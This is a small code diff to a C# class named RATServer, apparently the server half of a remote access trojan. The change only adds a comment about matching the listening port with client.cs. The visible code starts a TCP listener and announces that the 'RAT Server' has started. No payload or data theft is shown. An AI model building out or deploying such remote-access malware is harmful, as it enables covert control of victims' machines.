@@ -11,7 +11,7 @@ class RATServer
 
     static void Main()
     {
-        int listenPort = 3000;
+        int listenPort = 3000; //make sure this is the same port as in client.cs
         TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
         listener.Start();
         Console.WriteLine("\n[+] RAT Server Started");
